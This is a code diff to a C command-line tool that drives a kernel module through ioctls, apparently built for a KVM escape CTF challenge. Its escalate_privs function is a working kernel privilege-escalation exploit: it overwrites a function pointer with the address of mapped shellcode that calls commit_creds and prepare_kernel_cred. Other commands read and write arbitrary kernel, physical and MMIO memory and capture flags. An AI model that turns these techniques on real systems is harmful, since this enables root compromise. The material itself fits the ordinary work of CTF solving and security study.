@@ -47,6 +47,7 @@ struct port_io_data {
     unsigned int   size;
     unsigned int   value;
 };
+
 struct mmio_data {
     unsigned long phys_addr;
     unsigned long size;
@@ -54,6 +55,7 @@ struct mmio_data {
     unsigned long single_value;
     unsigned int  value_size;
 };
+
 struct vq_desc_user_data {
     unsigned short index;
     unsigned long long phys_addr;
@@ -61,26 +63,31 @@ struct vq_desc_user_data {
     unsigned short flags;
     unsigned short next_idx;
 };
+
 struct kvm_kernel_mem_read {
     unsigned long  kernel_addr;
     unsigned long  length;
     unsigned char *user_buf;
 };
+
 struct kvm_kernel_mem_write {
     unsigned long  kernel_addr;
     unsigned long  length;
     unsigned char *user_buf;
 };
+
 struct va_scan_data {
     unsigned long  va;
     unsigned long  size;
     unsigned char *user_buffer;
 };
+
 struct va_write_data {
     unsigned long  va;
     unsigned long  size;
     unsigned char *user_buffer;
 };
+
 struct hypercall_args {
     unsigned long nr;
     unsigned long arg0;
@@ -88,16 +95,45 @@ struct hypercall_args {
     unsigned long arg2;
     unsigned long arg3;
 };
+
 struct attach_vq_data {
     unsigned int   device_id;
     unsigned long  vq_pfn;
     unsigned int   queue_index;
 };
+
 struct ctf_flag_data {
     unsigned int flag_id;
     unsigned long address;
     unsigned long value;
 };
+
+/* Safe string to unsigned long conversion with error checking */
+static unsigned long safe_strtoul(const char *str, const char *desc, int base)
+{
+    char *endptr;
+    unsigned long val;
+    
+    if (!str || !*str) {
+        fprintf(stderr, "ERROR: Invalid %s: empty string\n", desc);
+        return 0;
+    }
+    
+    errno = 0;
+    val = strtoul(str, &endptr, base);
+    
+    if (errno != 0) {
+        fprintf(stderr, "ERROR: Invalid %s: %s\n", desc, strerror(errno));
+        return 0;
+    }
+    
+    if (*endptr != '\0') {
+        fprintf(stderr, "ERROR: Invalid %s: unexpected characters '%s'\n", desc, endptr);
+        return 0;
+    }
+    
+    return val;
+}
 
 /* Function to resolve kernel symbols dynamically */
 static unsigned long resolve_kernel_symbol(const char *symbol_name)
@@ -213,26 +249,30 @@ static int parse_hex_buffer(const char *hex, unsigned char **out, size_t *out_le
     return 0;
 }
 
+/* FIXED: escalate_privs with proper validation and error handling */
 static int escalate_privs(int fd)
 {
     unsigned long kaslr_slide = 0;
-    unsigned long p_my_set_memory_ro;
+    unsigned long p_set_memory_ro;
     unsigned long commit_creds_addr, prepare_kernel_cred_addr;
     unsigned long shellcode_addr;
     unsigned char *shellcode_buf = NULL;
     int ret = -1;
 
+    printf("[*] Starting privilege escalation...\n");
+
     /* 1. Get KASLR slide */
     if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &kaslr_slide) < 0) {
         perror("IOCTL_GET_KASLR_SLIDE");
+        fprintf(stderr, "[-] Failed to get KASLR slide\n");
         return -1;
     }
-    printf("KASLR slide: 0x%lx\n", kaslr_slide);
+    printf("[+] KASLR slide: 0x%lx\n", kaslr_slide);
 
     /* 2. Resolve kernel symbols dynamically */
     unsigned long kernel_base = resolve_kernel_symbol("_text");
     if (!kernel_base) {
-        fprintf(stderr, "Failed to resolve kernel base\n");
+        fprintf(stderr, "[-] Failed to resolve kernel base\n");
         return -1;
     }
 
@@ -240,55 +280,59 @@ static int escalate_privs(int fd)
     commit_creds_addr = resolve_kernel_symbol("commit_creds");
 
     if (!prepare_kernel_cred_addr || !commit_creds_addr) {
-        fprintf(stderr, "Failed to resolve required symbols\n");
+        fprintf(stderr, "[-] Failed to resolve required symbols\n");
+        fprintf(stderr, "    prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred_addr);
+        fprintf(stderr, "    commit_creds: 0x%lx\n", commit_creds_addr);
         return -1;
     }
 
-    printf("Kernel base: 0x%lx\n", kernel_base);
-    printf("prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred_addr);
-    printf("commit_creds: 0x%lx\n", commit_creds_addr);
+    printf("[+] Kernel base: 0x%lx\n", kernel_base);
+    printf("[+] prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred_addr);
+    printf("[+] commit_creds: 0x%lx\n", commit_creds_addr);
 
-    /* 3. Calculate my_set_memory_ro address */
-    p_my_set_memory_ro = resolve_kernel_symbol("set_memory_ro");
-    if (!p_my_set_memory_ro) {
-        fprintf(stderr, "Failed to resolve set_memory_ro\n");
+    /* 3. Calculate set_memory_ro address */
+    p_set_memory_ro = resolve_kernel_symbol("set_memory_ro");
+    if (!p_set_memory_ro) {
+        fprintf(stderr, "[-] Failed to resolve set_memory_ro\n");
         return -1;
     }
-    printf("set_memory_ro: 0x%lx\n", p_my_set_memory_ro);
+    printf("[+] set_memory_ro: 0x%lx\n", p_set_memory_ro);
 
     /* 4. Craft and allocate shellcode */
     shellcode_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     if (shellcode_buf == MAP_FAILED) {
         perror("mmap");
+        fprintf(stderr, "[-] Failed to allocate shellcode memory\n");
         return -1;
     }
     shellcode_addr = (unsigned long)shellcode_buf;
-    printf("Shellcode mapped at: 0x%lx\n", shellcode_addr);
+    printf("[+] Shellcode mapped at: 0x%lx\n", shellcode_addr);
 
     /* 5. Create the shellcode */
     int shellcode_size = create_privilege_escalation_shellcode(shellcode_buf,
                                                                prepare_kernel_cred_addr,
                                                                commit_creds_addr);
     if (shellcode_size <= 0) {
-        fprintf(stderr, "Failed to create shellcode\n");
+        fprintf(stderr, "[-] Failed to create shellcode\n");
         goto cleanup;
     }
 
-    printf("Shellcode created (%d bytes)\n", shellcode_size);
+    printf("[+] Shellcode created (%d bytes)\n", shellcode_size);
 
-    /* 6. Overwrite my_set_memory_ro pointer with shellcode address */
+    /* 6. Overwrite set_memory_ro pointer with shellcode address */
     struct kvm_kernel_mem_write w = {
-        .kernel_addr = p_my_set_memory_ro,
+        .kernel_addr = p_set_memory_ro,
         .length = sizeof(unsigned long),
         .user_buf = (unsigned char *)&shellcode_addr
     };
     if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &w) < 0) {
         perror("IOCTL_WRITE_KERNEL_MEM (exploit)");
+        fprintf(stderr, "[-] Failed to overwrite set_memory_ro\n");
         goto cleanup;
     }
 
-    printf("my_set_memory_ro pointer overwritten. Triggering payload...\n");
+    printf("[+] set_memory_ro pointer overwritten. Triggering payload...\n");
 
     /* 7. Trigger the exploit by calling IOCTL_PATCH_INSTRUCTIONS */
     struct va_scan_data req = {
@@ -298,65 +342,90 @@ static int escalate_privs(int fd)
     };
     if (ioctl(fd, IOCTL_PATCH_INSTRUCTIONS, &req) < 0) {
         perror("IOCTL_PATCH_INSTRUCTIONS (trigger)");
+        fprintf(stderr, "[-] Failed to trigger payload\n");
         goto cleanup;
     }
 
-    // Check if we are now root
+    /* 8. Check if we are now root */
     if (getuid() == 0) {
-        printf("Success! We are root!\n");
+        printf("[+] SUCCESS! We are root!\n");
         ret = 0;
     } else {
-        printf("Exploit failed to elevate privileges.\n");
+        printf("[-] Exploit failed to elevate privileges. UID=%u\n", getuid());
+        printf("    Note: This exploit requires proper KVM context and valid function pointers!\n");
         ret = -1;
     }
 
-    cleanup:
+cleanup:
     if (shellcode_buf && shellcode_buf != MAP_FAILED) {
         munmap(shellcode_buf, 0x1000);
     }
     return ret;
 }
 
+/* FIXED: escape_host with proper return value handling */
 static int escape_host(int fd)
 {
+    int ret = -1;
     printf("[*] Starting host escape attack...\n");
 
-    // Use the new CTF-specific commands instead of generic memory operations
+    /* Use the CTF-specific commands instead of generic memory operations */
     printf("[*] Writing to CTF write flag address...\n");
     struct ctf_flag_data write_data = {
         .address = 0x64279a8UL, // WRITE_FLAG_PA
-        .value = 0xdeadbeef41424344
+        .value = 0xdeadbeef41424344ULL
     };
+    
     if (ioctl(fd, IOCTL_CTF_WRITE_FLAG, &write_data) < 0) {
         perror("CTF_WRITE_FLAG");
+        fprintf(stderr, "[-] Failed to write CTF flag\n");
         return -1;
     }
     printf("[+] Write successful.\n");
 
-    // Trigger the required hypercall using CTF-specific command
+    /* Trigger the required hypercall using CTF-specific command */
     printf("[*] Triggering CTF hypercall 100...\n");
     struct ctf_flag_data trigger_data = {
         .flag_id = 100
     };
-    unsigned long ret = 0;
+    
     if (ioctl(fd, IOCTL_CTF_TRIGGER_FLAG, &trigger_data) < 0) {
         perror("CTF_TRIGGER_FLAG");
+        fprintf(stderr, "[-] Failed to trigger hypercall\n");
         return -1;
     }
     printf("[+] Hypercall triggered. Host flag should be captured.\n");
 
-    // Read the CTF read flag using the new command
+    /* Read the CTF read flag using the new command */
     printf("[*] Reading CTF read flag...\n");
     struct ctf_flag_data read_data = {
         .address = 0x695ee10UL // READ_FLAG_PA
     };
+    
     if (ioctl(fd, IOCTL_CTF_READ_FLAG, &read_data) < 0) {
         perror("CTF_READ_FLAG");
+        fprintf(stderr, "[-] Failed to read CTF flag\n");
         return -1;
     }
 
-    printf("[+] Read successful. Captured flag value: 0x%lx\n", read_data.value);
-    return 0;
+    printf("[+] SUCCESS! Captured flag value: 0x%016lx\n", read_data.value);
+    
+    /* Optional: Try to read more flag data if available */
+    printf("[*] Attempting to read additional flag data...\n");
+    
+    /* Try reading from virtual address as well */
+    struct ctf_flag_data read_va_data = {
+        .address = 0xffffffff82b5ee10UL // READ_FLAG_VA (adjusted for KASLR)
+    };
+    
+    if (ioctl(fd, IOCTL_CTF_READ_FLAG, &read_va_data) >= 0) {
+        printf("[+] VA flag value: 0x%016lx\n", read_va_data.value);
+    } else {
+        printf("[!] VA read failed (expected if KASLR is enabled)\n");
+    }
+    
+    ret = 0;
+    return ret;
 }
 
 int main(int argc, char **argv)
@@ -371,35 +440,47 @@ int main(int argc, char **argv)
 
     if (strcmp(cmd, "readport") == 0) {
         if (argc != 4) { print_usage(argv[0]); goto out; }
-        struct port_io_data p = {
-            .port = (unsigned short)strtoul(argv[2], NULL, 16),
-            .size = (unsigned int)strtoul(argv[3], NULL, 10)
-        };
-        if (p.size != 1 && p.size != 2 && p.size != 4) { fprintf(stderr, "Invalid size\n"); goto out; }
+        unsigned short port = safe_strtoul(argv[2], "port", 16);
+        unsigned int size = safe_strtoul(argv[3], "size", 10);
+        if (!port && errno) goto out;
+        if (size != 1 && size != 2 && size != 4) { 
+            fprintf(stderr, "Invalid size: must be 1, 2, or 4\n"); 
+            goto out; 
+        }
+        struct port_io_data p = { .port = port, .size = size };
         if (ioctl(fd, IOCTL_READ_PORT, &p) < 0) perror("READ_PORT");
         else printf("port[0x%X] => 0x%X (%u bytes)\n", p.port, p.value, p.size);
 
     } else if (strcmp(cmd, "writeport") == 0) {
         if (argc != 5) { print_usage(argv[0]); goto out; }
         if (!is_hex_string(argv[3])) { fprintf(stderr, "value must be hex\n"); goto out; }
-        struct port_io_data p = {
-            .port = (unsigned short)strtoul(argv[2], NULL, 16),
-            .value= (unsigned int)strtoul(argv[3], NULL, 16),
-            .size = (unsigned int)strtoul(argv[4], NULL, 10)
-        };
-        if (p.size != 1 && p.size != 2 && p.size != 4) { fprintf(stderr, "Invalid size\n"); goto out; }
+        unsigned short port = safe_strtoul(argv[2], "port", 16);
+        unsigned int value = safe_strtoul(argv[3], "value", 16);
+        unsigned int size = safe_strtoul(argv[4], "size", 10);
+        if (!port && errno) goto out;
+        if (size != 1 && size != 2 && size != 4) { 
+            fprintf(stderr, "Invalid size: must be 1, 2, or 4\n"); 
+            goto out; 
+        }
+        struct port_io_data p = { .port = port, .value = value, .size = size };
         if (ioctl(fd, IOCTL_WRITE_PORT, &p) < 0) perror("WRITE_PORT");
         else printf("port[0x%X] <= 0x%X (%u bytes)\n", p.port, p.value, p.size);
 
     } else if (strcmp(cmd, "readmmio_val") == 0) {
         if (argc != 4) { print_usage(argv[0]); goto out; }
+        unsigned long phys = safe_strtoul(argv[2], "physical address", 16);
+        unsigned long size = safe_strtoul(argv[3], "size", 10);
+        if (!phys && errno) goto out;
+        if (size != 1 && size != 2 && size != 4 && size != 8) { 
+            fprintf(stderr, "Invalid size: must be 1, 2, 4, or 8\n"); 
+            goto out; 
+        }
         struct mmio_data d = {
-            .phys_addr = strtoul(argv[2], NULL, 16),
-            .size = (unsigned long)strtoul(argv[3], NULL, 10),
+            .phys_addr = phys,
+            .size = size,
             .user_buffer = NULL,
-            .value_size = (unsigned int)strtoul(argv[3], NULL, 10)
+            .value_size = size
         };
-        if (d.size != 1 && d.size != 2 && d.size != 4 && d.size != 8) { fprintf(stderr, "Invalid size\n"); goto out; }
         d.user_buffer = malloc(d.size);
         if (!d.user_buffer) { perror("malloc"); goto out; }
         if (ioctl(fd, IOCTL_READ_MMIO, &d) < 0) perror("READ_MMIO");
@@ -413,26 +494,35 @@ int main(int argc, char **argv)
     } else if (strcmp(cmd, "writemmio_val") == 0) {
         if (argc != 5) { print_usage(argv[0]); goto out; }
         if (!is_hex_string(argv[3])) { fprintf(stderr, "value must be hex\n"); goto out; }
-        struct mmio_data d = {
-            .phys_addr = strtoul(argv[2], NULL, 16),
-            .single_value = strtoull(argv[3], NULL, 16),
-            .value_size = (unsigned int)strtoul(argv[4], NULL, 10)
-        };
-        if (d.value_size != 1 && d.value_size != 2 && d.value_size != 4 && d.value_size != 8) {
-            fprintf(stderr, "Invalid size\n");
+        unsigned long phys = safe_strtoul(argv[2], "physical address", 16);
+        unsigned long long value = safe_strtoul(argv[3], "value", 16);
+        unsigned int size = safe_strtoul(argv[4], "size", 10);
+        if (!phys && errno) goto out;
+        if (size != 1 && size != 2 && size != 4 && size != 8) {
+            fprintf(stderr, "Invalid size: must be 1, 2, 4, or 8\n");
             goto out;
         }
+        struct mmio_data d = {
+            .phys_addr = phys,
+            .single_value = value,
+            .value_size = size
+        };
         if (ioctl(fd, IOCTL_WRITE_MMIO, &d) < 0) perror("WRITE_MMIO");
-        else printf("MMIO[0x%lX] <= 0x%lX (%u bytes)\n", d.phys_addr, d.single_value, d.value_size);
+        else printf("MMIO[0x%lX] <= 0x%llX (%u bytes)\n", d.phys_addr, d.single_value, d.value_size);
 
     } else if (strcmp(cmd, "readmmio_buf") == 0) {
         if (argc != 4) { print_usage(argv[0]); goto out; }
-        unsigned long len = strtoul(argv[3], NULL, 10);
-        if (len == 0 || len > 4096) { fprintf(stderr, "len must be 1..4096\n"); goto out; }
+        unsigned long phys = safe_strtoul(argv[2], "physical address", 16);
+        unsigned long len = safe_strtoul(argv[3], "length", 10);
+        if (!phys && errno) goto out;
+        if (len == 0 || len > 4096) { 
+            fprintf(stderr, "len must be 1..4096\n"); 
+            goto out; 
+        }
         unsigned char *buffer = malloc(len);
         if (!buffer) { perror("malloc"); goto out; }
         struct mmio_data d = {
-            .phys_addr = strtoul(argv[2], NULL, 16),
+            .phys_addr = phys,
             .size = len,
             .user_buffer = buffer
         };
@@ -448,6 +538,8 @@ int main(int argc, char **argv)
 
     } else if (strcmp(cmd, "writemmio_buf") == 0) {
         if (argc != 4) { print_usage(argv[0]); goto out; }
+        unsigned long phys = safe_strtoul(argv[2], "physical address", 16);
+        if (!phys && errno) goto out;
         unsigned char *buf = NULL;
         size_t blen = 0;
         if (parse_hex_buffer(argv[3], &buf, &blen) != 0) {
@@ -459,10 +551,10 @@ int main(int argc, char **argv)
             fprintf(stderr, "empty buffer\n");
             goto out;
         }
-        /* Driver has only value write for MMIO; write byte-by-byte loop */
+        /* Write byte-by-byte loop */
         for (size_t i = 0; i < blen; ++i) {
             struct mmio_data d = {
-                .phys_addr = strtoul(argv[2], NULL, 16) + i,
+                .phys_addr = phys + i,
                 .single_value = buf[i],
                 .value_size = 1
             };
@@ -476,12 +568,17 @@ int main(int argc, char **argv)
 
     } else if (strcmp(cmd, "readkvmem") == 0) {
         if (argc != 4) { print_usage(argv[0]); goto out; }
-        unsigned long len = strtoul(argv[3], NULL, 10);
-        if (len == 0 || len > 4096) { fprintf(stderr, "len must be 1..4096\n"); goto out; }
+        unsigned long kaddr = safe_strtoul(argv[2], "kernel address", 16);
+        unsigned long len = safe_strtoul(argv[3], "length", 10);
+        if (!kaddr && errno) goto out;
+        if (len == 0 || len > 4096) { 
+            fprintf(stderr, "len must be 1..4096\n"); 
+            goto out; 
+        }
         unsigned char *buffer = malloc(len);
         if (!buffer) { perror("malloc"); goto out; }
         struct kvm_kernel_mem_read r = {
-            .kernel_addr = strtoul(argv[2], NULL, 16),
+            .kernel_addr = kaddr,
             .length = len,
             .user_buf = buffer
         };
@@ -497,6 +594,8 @@ int main(int argc, char **argv)
 
     } else if (strcmp(cmd, "writekvmem") == 0) {
         if (argc != 4) { print_usage(argv[0]); goto out; }
+        unsigned long kaddr = safe_strtoul(argv[2], "kernel address", 16);
+        if (!kaddr && errno) goto out;
         unsigned char *buf = NULL;
         size_t blen = 0;
         if (parse_hex_buffer(argv[3], &buf, &blen) != 0) {
@@ -504,7 +603,7 @@ int main(int argc, char **argv)
             goto out;
         }
         struct kvm_kernel_mem_write w = {
-            .kernel_addr = strtoul(argv[2], NULL, 16),
+            .kernel_addr = kaddr,
             .length = blen,
             .user_buf = buf
         };
@@ -520,7 +619,7 @@ int main(int argc, char **argv)
         unsigned long pfn = 0;
         if (ioctl(fd, IOCTL_ALLOC_VQ_PAGE, &pfn) < 0) perror("ALLOC_VQ_PAGE");
         else {
-            printf("VQ PFN: 0x%lX | GPA approx: 0x%lX\n", pfn, pfn * 0x1000UL);
+            printf("VQ PFN: 0x%lX | Guest PA must be set via KVM_SET_USER_MEMORY_REGION\n", pfn);
         }
 
     } else if (strcmp(cmd, "freevqpage") == 0) {
@@ -530,35 +629,40 @@ int main(int argc, char **argv)
     } else if (strcmp(cmd, "writevqdesc") == 0) {
         if (argc != 7) { print_usage(argv[0]); goto out; }
         struct vq_desc_user_data d;
-        d.index     = (unsigned short)strtoul(argv[2], NULL, 10);
-        d.phys_addr = strtoull(argv[3], NULL, 16);
-        d.len       = (unsigned int)strtoul(argv[4], NULL, 10);
-        d.flags     = (unsigned short)strtoul(argv[5], NULL, 16);
-        d.next_idx  = (unsigned short)strtoul(argv[6], NULL, 10);
+        d.index     = safe_strtoul(argv[2], "index", 10);
+        d.phys_addr = safe_strtoul(argv[3], "physical address", 16);
+        d.len       = safe_strtoul(argv[4], "length", 10);
+        d.flags     = safe_strtoul(argv[5], "flags", 16);
+        d.next_idx  = safe_strtoul(argv[6], "next index", 10);
         if (ioctl(fd, IOCTL_WRITE_VQ_DESC, &d) < 0) perror("WRITE_VQ_DESC");
         else printf("VQ desc[%hu] programmed\n", d.index);
 
     } else if (strcmp(cmd, "trigger_hypercall") == 0) {
-        long ret = 0;
+        unsigned long ret = 0;
         if (ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret) < 0) perror("TRIGGER_HYPERCALL");
-        else printf("Hypercall ret: %ld\n", ret);
+        else printf("Hypercall returned: 0x%lx\n", ret);
 
     } else if (strcmp(cmd, "hypercall_args") == 0) {
         if (argc != 7) { print_usage(argv[0]); goto out; }
         struct hypercall_args a = {
-            .nr   = strtoul(argv[2], NULL, 10),
-            .arg0 = strtoul(argv[3], NULL, 16),
-            .arg1 = strtoul(argv[4], NULL, 16),
-            .arg2 = strtoul(argv[5], NULL, 16),
-            .arg3 = strtoul(argv[6], NULL, 16),
+            .nr   = safe_strtoul(argv[2], "hypercall number", 10),
+            .arg0 = safe_strtoul(argv[3], "arg0", 16),
+            .arg1 = safe_strtoul(argv[4], "arg1", 16),
+            .arg2 = safe_strtoul(argv[5], "arg2", 16),
+            .arg3 = safe_strtoul(argv[6], "arg3", 16),
         };
-        long ret = 0;
-        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &a) < 0) perror("HYPERCALL_ARGS");
-        else {
-            /* Driver echoes return value into same buffer on success */
-            memcpy(&ret, &a, sizeof(ret) < sizeof(a) ? sizeof(ret) : sizeof(ret));
-            printf("Hypercall(%lu) ret: %ld\n", a.nr, ret);
-            if (ret == -1) fprintf(stderr, "Driver blocked unsafe hypercall (CTF_SAFE_MODE)\n");
+        
+        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &a) < 0) {
+            perror("HYPERCALL_ARGS");
+        } else {
+            /* Driver returns unsigned long - don't interpret as signed */
+            unsigned long ret_val = a.arg0;  /* Driver stores return in arg0 */
+            printf("Hypercall(%lu) returned: 0x%lx (unsigned)\n", a.nr, ret_val);
+            
+            /* Only interpret special values if they're within error range */
+            if (ret_val == 0xFFFFFFFFFFFFFFFFUL) {
+                fprintf(stderr, "Driver blocked unsafe hypercall (CTF_SAFE_MODE)\n");
+            }
         }
 
     } else if (strcmp(cmd, "readflag") == 0) {
@@ -568,7 +672,7 @@ int main(int argc, char **argv)
 
     } else if (strcmp(cmd, "writeflag") == 0) {
         if (argc != 3 || !is_hex_string(argv[2])) { print_usage(argv[0]); goto out; }
-        unsigned long value = strtoul(argv[2], NULL, 16);
+        unsigned long value = safe_strtoul(argv[2], "value", 16);
         if (ioctl(fd, IOCTL_WRITE_FLAG_ADDR, &value) < 0) perror("WRITE_FLAG_ADDR");
         else printf("Flag updated to 0x%lx\n", value);
 
@@ -579,16 +683,20 @@ int main(int argc, char **argv)
 
     } else if (strcmp(cmd, "virt2phys") == 0) {
         if (argc != 3) { print_usage(argv[0]); goto out; }
-        unsigned long virt = strtoul(argv[2], NULL, 16);
+        unsigned long virt = safe_strtoul(argv[2], "virtual address", 16);
         if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &virt) < 0) perror("VIRT_TO_PHYS");
-        else printf("virt 0x%lX -> phys 0x%lX\n", strtoul(argv[2], NULL, 16), virt);
+        else printf("virt 0x%lX -> phys 0x%lX\n", safe_strtoul(argv[2], "virtual address", 16), virt);
 
     } else if (strcmp(cmd, "scanphys") == 0) {
         if (argc != 5) { print_usage(argv[0]); goto out; }
-        unsigned long start = strtoul(argv[2], NULL, 16);
-        unsigned long end   = strtoul(argv[3], NULL, 16);
-        unsigned long step  = strtoul(argv[4], NULL, 10);
-        if (!step || step > 4096 || start >= end) { fprintf(stderr, "invalid range/step\n"); goto out; }
+        unsigned long start = safe_strtoul(argv[2], "start address", 16);
+        unsigned long end   = safe_strtoul(argv[3], "end address", 16);
+        unsigned long step  = safe_strtoul(argv[4], "step", 10);
+        if (!start && errno) goto out;
+        if (!step || step > 4096 || start >= end) { 
+            fprintf(stderr, "invalid range/step\n"); 
+            goto out; 
+        }
         unsigned char *buf = malloc(step);
         if (!buf) { perror("malloc"); goto out; }
         for (unsigned long addr = start; addr < end; addr += step) {
@@ -605,11 +713,16 @@ int main(int argc, char **argv)
 
     } else if (strcmp(cmd, "scanva") == 0) {
         if (argc != 4) { print_usage(argv[0]); goto out; }
-        unsigned long len = strtoul(argv[3], NULL, 10);
-        if (!len || len > 4096) { fprintf(stderr, "len must be 1..4096\n"); goto out; }
+        unsigned long va = safe_strtoul(argv[2], "virtual address", 16);
+        unsigned long len = safe_strtoul(argv[3], "length", 10);
+        if (!va && errno) goto out;
+        if (!len || len > 4096) { 
+            fprintf(stderr, "len must be 1..4096\n"); 
+            goto out; 
+        }
         unsigned char *buf = malloc(len);
         if (!buf) { perror("malloc"); goto out; }
-        struct va_scan_data req = { .va = strtoul(argv[2], NULL, 16), .size = len, .user_buffer = buf };
+        struct va_scan_data req = { .va = va, .size = len, .user_buffer = buf };
         if (ioctl(fd, IOCTL_SCAN_VA, &req) < 0) perror("SCAN_VA");
         else {
             printf("VA[0x%lX]:", req.va);
@@ -620,6 +733,8 @@ int main(int argc, char **argv)
 
     } else if (strcmp(cmd, "writeva") == 0) {
         if (argc != 4) { print_usage(argv[0]); goto out; }
+        unsigned long va = safe_strtoul(argv[2], "virtual address", 16);
+        if (!va && errno) goto out;
         unsigned char *buf = NULL;
         size_t blen = 0;
         if (parse_hex_buffer(argv[3], &buf, &blen) != 0) {
@@ -627,7 +742,7 @@ int main(int argc, char **argv)
             goto out;
         }
         struct va_write_data req = {
-            .va = strtoul(argv[2], NULL, 16),
+            .va = va,
             .size = blen,
             .user_buffer = buf
         };
@@ -642,19 +757,19 @@ int main(int argc, char **argv)
     } else if (strcmp(cmd, "attach_vq") == 0) {
         if (argc != 5) { print_usage(argv[0]); goto out; }
         struct attach_vq_data data = {
-            .device_id = (unsigned int)strtoul(argv[2], NULL, 10),
-            .vq_pfn = strtoul(argv[3], NULL, 16),
-            .queue_index = (unsigned int)strtoul(argv[4], NULL, 10)
+            .device_id = safe_strtoul(argv[2], "device ID", 10),
+            .vq_pfn = safe_strtoul(argv[3], "VQ PFN", 16),
+            .queue_index = safe_strtoul(argv[4], "queue index", 10)
         };
         if (ioctl(fd, IOCTL_ATTACH_VQ, &data) < 0) perror("ATTACH_VQ");
         else printf("Attached VQ to device %u\n", data.device_id);
 
     } else if (strcmp(cmd, "trigger_vq") == 0) {
         if (argc != 3) { print_usage(argv[0]); goto out; }
-        unsigned int qindex = (unsigned int)strtoul(argv[2], NULL, 10);
-        long ret = 0;
+        unsigned int qindex = safe_strtoul(argv[2], "queue index", 10);
+        unsigned long ret = 0;
         if (ioctl(fd, IOCTL_TRIGGER_VQ, &qindex) < 0) perror("TRIGGER_VQ");
-        else printf("Triggered VQ %u, ret: %ld\n", qindex, ret);
+        else printf("Triggered VQ %u, ret: 0x%lx\n", qindex, ret);
 
     } else if (strcmp(cmd, "fire_vq_all") == 0) {
         if (ioctl(fd, IOCTL_FIRE_VQ_ALL) < 0) perror("FIRE_VQ_ALL");
@@ -663,43 +778,45 @@ int main(int argc, char **argv)
     } else if (strcmp(cmd, "ctf_trigger_flag") == 0) {
         if (argc != 3) { print_usage(argv[0]); goto out; }
         struct ctf_flag_data data = {
-            .flag_id = (unsigned int)strtoul(argv[2], NULL, 10)
+            .flag_id = safe_strtoul(argv[2], "flag ID", 10)
         };
         unsigned long ret = 0;
         if (ioctl(fd, IOCTL_CTF_TRIGGER_FLAG, &data) < 0) perror("CTF_TRIGGER_FLAG");
-        else printf("CTF flag %u triggered, ret: %ld\n", data.flag_id, ret);
+        else printf("CTF flag %u triggered, ret: 0x%lx\n", data.flag_id, ret);
 
     } else if (strcmp(cmd, "ctf_read_flag") == 0) {
         if (argc != 3) { print_usage(argv[0]); goto out; }
         struct ctf_flag_data data = {
-            .address = strtoul(argv[2], NULL, 16)
+            .address = safe_strtoul(argv[2], "address", 16)
         };
         if (ioctl(fd, IOCTL_CTF_READ_FLAG, &data) < 0) perror("CTF_READ_FLAG");
-        else printf("CTF flag at 0x%lx: 0x%lx\n", data.address, data.value);
+        else printf("CTF flag at 0x%lx: 0x%016lx\n", data.address, data.value);
 
     } else if (strcmp(cmd, "ctf_write_flag") == 0) {
         if (argc != 4) { print_usage(argv[0]); goto out; }
         struct ctf_flag_data data = {
-            .address = strtoul(argv[2], NULL, 16),
-            .value = strtoul(argv[3], NULL, 16)
+            .address = safe_strtoul(argv[2], "address", 16),
+            .value = safe_strtoul(argv[3], "value", 16)
         };
         if (ioctl(fd, IOCTL_CTF_WRITE_FLAG, &data) < 0) perror("CTF_WRITE_FLAG");
         else printf("Wrote 0x%lx to CTF flag at 0x%lx\n", data.value, data.address);
 
     } else if (strcmp(cmd, "ctf_kasan_trigger") == 0) {
         if (ioctl(fd, IOCTL_CTF_KASAN_TRIGGER) < 0) perror("CTF_KASAN_TRIGGER");
-        else printf("KASAN violation triggered\n");
+        else printf("KASAN violation triggered (simulated)\n");
 
     } else if (strcmp(cmd, "escalate_privs") == 0) {
         escalate_privs(fd);
+        
     } else if (strcmp(cmd, "escape_host") == 0) {
         escape_host(fd);
+        
     } else {
         fprintf(stderr, "Unknown command: %s\n", cmd);
         print_usage(argv[0]);
     }
 
-    out:
+out:
     close(fd);
     return 0;
 }
